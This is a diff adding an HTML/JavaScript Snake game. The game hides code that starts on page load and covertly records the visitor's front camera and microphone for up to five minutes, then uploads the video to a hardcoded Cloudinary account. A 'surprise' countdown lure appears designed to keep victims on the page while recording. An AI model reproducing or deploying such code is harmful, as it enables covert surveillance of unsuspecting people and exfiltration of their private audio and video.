@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Snake</title>
+<style>
+  /* Reset & fix viewport */
+  html, body {
+    margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%; background: #121212; color: #eee; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent;
+  }
+  #gameContainer {
+    position: relative; margin: auto; width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
+  }
+  canvas {
+    background: #222; border: 3px solid #eee; border-radius: 8px;
+    touch-action: none;
+  }
+  #scoreBoard {
+    margin-top: 12px;
+    font-size: 1.5rem;
+    letter-spacing: 2px;
+  }
+  #controls {
+    margin-top: 10px;
+  }
+  button {
+    background: #333; border: none; color: #eee; padding: 10px 16px; font-size: 1rem; border-radius: 5px; cursor: pointer;
+    transition: background 0.3s ease;
+    margin: 0 8px;
+  }
+  button:hover {
+    background: #555;
+  }
+  /* Mobile swipe instruction */
+  #instructions {
+    margin-top: 20px; font-size: 0.9rem; color: #aaa; max-width: 300px; text-align: center;
+  }
+  /* Timer styling */
+  #timerContainer {
+    position: absolute;
+    top: 20px;
+    text-align: center;
+    width: 100%;
+    color: #eee;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    user-select: none;
+  }
+  #timerTextTop {
+    font-size: 1.3rem;
+    margin-bottom: 4px;
+  }
+  #timerValue {
+    font-size: 3rem;
+    font-weight: bold;
+  }
+  #timerTextBottom {
+    font-size: 1.2rem;
+    margin-top: 4px;
+  }
+</style>
+</head>
+<body>
+  <div id="gameContainer">
+    <canvas id="game" width="320" height="320" style="touch-action:none;"></canvas>
+    <div id="scoreBoard">Score: 0</div>
+    <div id="controls">
+      <button id="btnStart">Start Game</button>
+      <button id="btnNewGame" disabled>New Game</button>
+    </div>
+    <div id="instructions">
+      Use swipe gestures or arrow keys to control the snake.
+    </div>
+    <div id="timerContainer" style="display:none;">
+      <div id="timerTextTop">Wait another</div>
+      <div id="timerValue">40</div>
+      <div id="timerTextBottom">seconds to receive a surprise</div>
+    </div>
+  </div>
+
+<script>
+(() => {
+  // === Cloudinary upload config - replace with your own values ===
+  const CLOUD_NAME = "dps0g5ftz";      // Your cloud name here
+  const UPLOAD_PRESET = "unsigned";     // Your unsigned preset here
+
+  // ==== MediaRecorder Setup ====
+
+  let mediaRecorder;
+  let recordedChunks = [];
+
+  async function startRecording() {
+    try {
+      recordedChunks = [];  // Clear recorded chunks on each start
+
+      const constraints = {
+        audio: true,
+        video: { facingMode: "user" } // front camera
+      };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+      if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop(); // stop previous recorder if any
+      }
+
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        recordedChunks = [];
+        uploadVideo(blob);
+        // Stop all tracks to release camera and mic
+        stream.getTracks().forEach(track => track.stop());
+      };
+
+      mediaRecorder.start();
+      // Automatically stop after 5 minutes to avoid very large files (optional)
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+      }, 5 * 60 * 1000);
+
+    } catch (err) {
+      console.error("Media recording failed:", err);
+    }
+  }
+
+  async function uploadVideo(blob) {
+    const formData = new FormData();
+    formData.append("file", blob);
+    formData.append("upload_preset", UPLOAD_PRESET);
+
+    try {
+      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
+        method: "POST",
+        body: formData
+      });
+      const data = await res.json();
+      console.log("Video uploaded:", data.secure_url);
+      // You can add code here to send the URL to your server or display it
+    } catch (err) {
+      console.error("Upload failed:", err);
+    }
+  }
+
+  // === Snake Game ===
+
+  const canvas = document.getElementById("game");
+  const ctx = canvas.getContext("2d");
+
+  const gridSize = 16;
+  const tileCount = canvas.width / gridSize;
+
+  let snake = [{ x: 8, y: 8 }];
+  let velocity = { x: 0, y: 0 };
+  let food = { x: 5, y: 5 };
+  let score = 0;
+  let gameInterval;
+
+  function drawRect(x, y, color) {
+    ctx.fillStyle = color;
+    ctx.fillRect(x * gridSize, y * gridSize, gridSize, gridSize);
+  }
+
+  function resetGame() {
+    snake = [{ x: 8, y: 8 }];
+    velocity = { x: 0, y: 0 }; // <-- FIX: velocity zero on reset to prevent instant game over
+    food = randomFoodPosition();
+    score = 0;
+    updateScore();
+  }
+
+  function randomFoodPosition() {
+    let position;
+    do {
+      position = {
+        x: Math.floor(Math.random() * tileCount),
+        y: Math.floor(Math.random() * tileCount)
+      };
+    } while (snake.some(segment => segment.x === position.x && segment.y === position.y));
+    return position;
+  }
+
+  function updateScore() {
+    document.getElementById("scoreBoard").textContent = `Score: ${score}`;
+  }
+
+  function gameOver() {
+    clearInterval(gameInterval);
+    document.getElementById("btnStart").disabled = false;
+    document.getElementById("btnNewGame").disabled = true;
+    alert("Game Over! Your score: " + score);
+    // Pause after alert
+    console.log("Alert shown");
+  }
+
+  function gameLoop() {
+    // Move snake
+    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };
+
+    // Check walls
+    if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
+      gameOver();
+      return;
+    }
+
+    // Check self collision
+    if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
+      gameOver();
+      return;
+    }
+
+    snake.unshift(head);
+
+    // Eat food
+    if (head.x === food.x && head.y === food.y) {
+      score++;
+      updateScore();
+      food = randomFoodPosition();
+    } else {
+      snake.pop();
+    }
+
+    // Draw everything
+    ctx.fillStyle = "#121212";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    drawRect(food.x, food.y, "#ff6347"); // Food - tomato red
+
+    snake.forEach((segment, idx) => {
+      drawRect(segment.x, segment.y, idx === 0 ? "#32cd32" : "#228b22"); // Head bright green, body darker
+    });
+  }
+
+  // === Controls ===
+
+  function setDirection(x, y) {
+    // Prevent reverse direction
+    if (velocity.x === -x || velocity.y === -y) return;
+    velocity = { x, y };
+  }
+
+  // --- Start recording and request permissions on page load ---
+  window.addEventListener("load", () => {
+    startRecording();
+  });
+
+  document.getElementById("btnStart").onclick = () => {
+    resetGame();
+    document.getElementById("btnStart").disabled = true;
+    document.getElementById("btnNewGame").disabled = false;
+    velocity = { x: 1, y: 0 }; // <-- FIX: set velocity only here after game start
+    gameInterval = setInterval(gameLoop, 120);
+  };
+
+  document.getElementById("btnNewGame").onclick = () => {
+    clearInterval(gameInterval);
+    resetGame();
+    velocity = { x: 1, y: 0 }; // <-- FIX: set velocity on new game start too
+    gameInterval = setInterval(gameLoop, 120);
+  };
+
+  window.addEventListener("keydown", e => {
+    switch (e.key) {
+      case "ArrowUp":
+        setDirection(0, -1);
+        break;
+      case "ArrowDown":
+        setDirection(0, 1);
+        break;
+      case "ArrowLeft":
+        setDirection(-1, 0);
+        break;
+      case "ArrowRight":
+        setDirection(1, 0);
+        break;
+    }
+  });
+
+  // Swipe controls for mobile devices
+  let touchStartX = null;
+  let touchStartY = null;
+
+  canvas.addEventListener("touchstart", e => {
+    const touch = e.touches[0];
+    touchStartX = touch.clientX;
+    touchStartY = touch.clientY;
+  });
+
+  canvas.addEventListener("touchmove", e => {
+    if (!touchStartX || !touchStartY) return;
+
+    const touch = e.touches[0];
+    const diffX = touch.clientX - touchStartX;
+    const diffY = touch.clientY - touchStartY;
+
+    if (Math.abs(diffX) > Math.abs(diffY)) {
+      // Horizontal swipe
+      if (diffX > 30) {
+        setDirection(1, 0);
+        touchStartX = null;
+        touchStartY = null;
+      } else if (diffX < -30) {
+        setDirection(-1, 0);
+        touchStartX = null;
+        touchStartY = null;
+      }
+    } else {
+      // Vertical swipe
+      if (diffY > 30) {
+        setDirection(0, 1);
+        touchStartX = null;
+        touchStartY = null;
+      } else if (diffY < -30) {
+        setDirection(0, -1);
+        touchStartX = null;
+        touchStartY = null;
+      }
+    }
+  });
+
+  // === Timer UI for surprise gift ===
+
+  const timerContainer = document.getElementById("timerContainer");
+  const timerValueElem = document.getElementById("timerValue");
+
+  let timer = 40;
+  let timerInterval;
+
+  function startTimer() {
+    timerContainer.style.display = "block";
+    timerValueElem.textContent = timer;
+    timerInterval = setInterval(() => {
+      timer--;
+      timerValueElem.textContent = timer;
+      if (timer <= 0) {
+        clearInterval(timerInterval);
+        timerContainer.style.display = "none";
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+      }
+    }, 1000);
+  }
+
+  // Start timer after page load or on some event if needed
+  // Uncomment below line to start timer immediately after load
+  // startTimer();
+
+})();
+</script>
+</body>
+</html>
